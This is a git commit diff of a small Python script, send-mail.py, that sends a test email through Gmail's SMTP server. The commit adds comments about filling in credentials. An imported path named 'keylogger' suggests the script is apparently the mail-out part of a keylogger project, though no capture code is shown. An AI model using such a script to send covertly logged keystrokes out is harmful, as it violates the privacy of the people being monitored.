3d6464cc6d86a26699321dd77d8d3aa146813258
ates-kuresi <ateskuresiz@gmail.com>
2021-10-01 08:08:41 +0300

    Update send-mail.py

--- send-mail.py
+++ send-mail.py
@@ -6,12 +6,12 @@ from email import encoders
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 import sys
-sys.path.insert(1, 'C:/Users/brkem/Desktop/keylogger')
-import idemail
+sys.path.insert(1, 'C:/Users/brkem/Desktop/keylogger') # delete this
+import idemail # delete this
 
 
-sender = idemail.myMail
-recievers = ['ateskuresiz@gmail.com', '']
+sender = idemail.myMail # you need to write your 'mail adress' instead 'idemail.myMail'
+recievers = ['ateskuresiz@gmail.com', ''] # recievers
 body_of_email = 'emaildeki yazi deneme'
 
 msg = MIMEText(body_of_email, 'html')
@@ -21,6 +21,6 @@ msg['To'] = ','.join(recievers)
 
 
 s = smtplib.SMTP_SSL(host = 'smtp.gmail.com', port= 465)
-s.login(user = sender, password= idemail.myPass)
+s.login(user = sender, password= idemail.myPass) # change password to 'password of your mail'
 s.sendmail(sender, recievers, msg.as_string())
 s.quit()
